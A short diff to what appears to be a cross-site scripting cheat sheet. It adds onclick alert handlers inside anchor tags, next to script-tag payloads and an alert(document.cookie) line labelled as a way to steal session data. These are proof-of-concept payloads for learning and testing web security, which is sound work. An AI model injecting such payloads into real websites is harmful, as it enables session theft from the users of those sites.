@@ -14,7 +14,9 @@
 <script>console.log('XSS')</script>
 
 + when <script> tag is not working, then use it within an html element
-onclick="alert(1)" 
+onclick="alert(1)"
+<a href="#" onclick="alert(1)">Click Me!</a>
+<a onclick="alert(1)">Click Me!</a>
 
 + See (steal) session data.
 <script>alert(document.cookie)</script>
